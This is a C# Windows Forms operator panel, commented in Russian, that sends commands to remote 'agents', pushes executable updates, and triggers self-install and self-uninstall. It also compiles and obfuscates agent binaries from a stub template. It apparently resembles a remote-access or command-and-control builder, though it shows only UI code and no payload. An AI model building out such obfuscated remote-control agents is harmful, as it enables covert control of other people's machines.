using System;
using System.Windows.Forms;
using System.IO;

namespace EdgeMesh.Core
{
    public partial class MainForm : Form
    {
        private ControllerManager controllerManager;

        public MainForm()
        {
            try
            {
                InitializeComponent();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка в InitializeComponent: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UpdateAgents(string agentInfo)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(UpdateAgents), agentInfo);
                return;
            }
            listBoxAgents.Items.Add(agentInfo);
        }

        private void ShowResponse(string response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(ShowResponse), response);
                return;
            }
            textBoxResponses.AppendText(response + Environment.NewLine);
        }

        // Обработчик уже реализован:
        private async void buttonSendCommand_Click(object sender, EventArgs e)
        {
            try
            {
                string selectedAgent = listBoxAgents.SelectedItem?.ToString();
                if (selectedAgent != null)
                {
                    string command = textBoxCommand.Text;
                    await controllerManager.SendCommand(selectedAgent, command);
                }
                else
                {
                    MessageBox.Show("Выберите агента из списка.", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            catch (Exception ex)
            {
                Logger.LogAsync($"Ошибка отправки команды: {ex.Message}").GetAwaiter().GetResult();
                MessageBox.Show($"Ошибка отправки команды: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void buttonCompileAgent_Click(object sender, EventArgs e)
        {
            try
            {
                var compiler = new SecureCompiler();
                await compiler.CompileAndObfuscate("AgentStub.cs", "SecureAgent.exe");
                MessageBox.Show("Агент скомпилирован", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                Logger.LogAsync($"Ошибка компиляции: {ex.Message}").GetAwaiter().GetResult();
                MessageBox.Show($"Ошибка компиляции: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void buttonUpdateAgent_Click(object sender, EventArgs e)
        {
            try
            {
                string selectedAgent = listBoxAgents.SelectedItem?.ToString();
                if (selectedAgent != null)
                {
                    using (OpenFileDialog openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Filter = "Исполняемые файлы (*.exe)|*.exe";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            await controllerManager.SendUpdate(selectedAgent, openFileDialog.FileName);
                            MessageBox.Show("Обновление отправлено", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Выберите агента из списка.", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            catch (Exception ex)
            {
                Logger.LogAsync($"Ошибка отправки обновления: {ex.Message}").GetAwaiter().GetResult();
                MessageBox.Show($"Ошибка отправки обновления: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void buttonSelfInstall_Click(object sender, EventArgs e)
        {
            string selectedAgent = listBoxAgents.SelectedItem?.ToString();
            if (selectedAgent != null)
            {
                await controllerManager.SendSelfInstall(selectedAgent);
                MessageBox.Show("Команда установки отправлена", "Успех");
            }
        }

        private async void buttonSelfUninstall_Click(object sender, EventArgs e)
        {
            string selectedAgent = listBoxAgents.SelectedItem?.ToString();
            if (selectedAgent != null)
            {
                await controllerManager.SendSelfUninstall(selectedAgent);
                MessageBox.Show("Команда удаления отправлена", "Успех");
            }
        }

        private void buttonBuildAgent_Click(object sender, EventArgs e)
        {
            string agentName = textBoxAgentName.Text;
            string agentType = comboBoxAgentType.SelectedItem?.ToString() ?? "Default";
            // Передайте параметры в компилятор
            CompileAgentWithParams(agentName, agentType);
        }

        private async void CompileAgentWithParams(string agentName, string agentType)
        {
            // Сгенерируйте исходник агента с нужными параметрами
            // Определяем путь к AgentStub.cs относительно корня проекта
            string projectDir = Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", ".."));
            string agentStubPath = Path.Combine(projectDir, "AgentStub.cs");
            string template = await File.ReadAllTextAsync(agentStubPath);
            string source = template.Replace("AgentStub", agentName);
            // Можно добавить замену типа и других параметров

            string tempSource = Path.GetTempFileName() + ".cs";
            string tempExe = Path.Combine(Environment.CurrentDirectory, $"{agentName}.exe");
            await File.WriteAllTextAsync(tempSource, source);

            var compiler = new SecureCompiler();
            await compiler.CompileAndObfuscate(tempSource, tempExe);

            textBoxLog.AppendText($"Агент {agentName} скомпилирован: {tempExe}\r\n");
        }

        private void UpdateAgentList()
        {
            // Обновить dataGridViewAgents на основе подключённых агентов
        }
    }
}